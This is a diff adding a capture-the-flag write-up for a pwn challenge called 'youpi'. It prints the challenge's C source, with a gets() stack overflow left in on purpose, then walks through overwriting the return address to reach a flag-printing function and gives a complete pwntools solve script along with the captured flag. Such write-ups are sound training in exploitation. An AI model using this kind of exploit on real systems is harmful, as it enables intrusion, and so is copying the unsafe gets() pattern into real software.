@@ -1032,3 +1032,118 @@ So basically what I did was to use gets() to receive our input which will then b
 Flag: battleCTF{Africa_1d3al_r0p_e70bee3af3e2b1430d8dc7863a33790d}
 ```
 
+#### youpi
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e8d6187f-26e2-4313-8403-bf57f2d47679)
+
+After downloading the attached file and unzipping it I got the source code and the binary
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/878efb5c-5663-4f4e-89d7-837c23a0682e)
+
+```c
+// gcc -o youpi youpi.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int check = 0;
+
+void youpiii(){
+	
+	if(check){
+		char buffer[20];
+		FILE * inputFile = fopen("flag.txt", "r" );
+		if ( inputFile == NULL ) {
+		    printf( "Cannot open file flag.txt\n" );
+		    exit( -1 );
+		}
+		fgets( buffer, 65, inputFile );
+		printf("FLAG: %s",buffer);
+	}
+
+}
+
+void main(){
+    puts("Welcome to Africa battleCTF.");
+    puts("Tell us about your country: ");
+    char buf[0x30];
+    gets( buf ); 
+}
+```
+
+From the source code we can see what it does:
+- The main function puts some text to stdout and receives our input using gets() #bug here
+- The youpiii function which is never called reads the flag.txt file and prints it out but before that is done it checks if the check global variable is true
+
+Since we can overwrite the RIP we can make the program to anywhere in the binary and therefore being able to skip the if check
+
+So if we are to jump to this function we need to jump to `youpiii+18`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7e731144-b335-4973-841a-f6b679b77164)
+
+Let us get the offset
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/44c7bfb7-be13-4823-a2d6-8467bd1daa03)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c71385b6-532e-4f89-a365-6098fef72d26)
+
+The offset is 56 but now the issue is that we need to make the base pointer a known address since jumping to `youpiii+18` will make the rbp messed up
+
+I just used the .data section 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/490c0d60-a0ae-4bc8-a704-385f7dbb9432)
+
+With that set here's my solve [script]()
+
+```python
+#!/usr/bin/python3
+from pwn import *
+import warnings
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+break *0x0000000000401188
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './youpi'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Start program
+io = start()
+
+offset = 48
+data = 0x00404030 # .data section
+
+# Build the payload
+payload = flat({
+    offset: [  
+        data,
+        0x0000000000401188
+    ]
+})
+
+io.sendline(payload)
+
+io.interactive()
+```
+
+Running it remotely works
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/edd9f132-c659-4756-9116-d6956ce88b06)
+
+```
+Flag: battleCTF{Right_jump_860332b9b9c47839ec975f0ecb32a51e}
+```
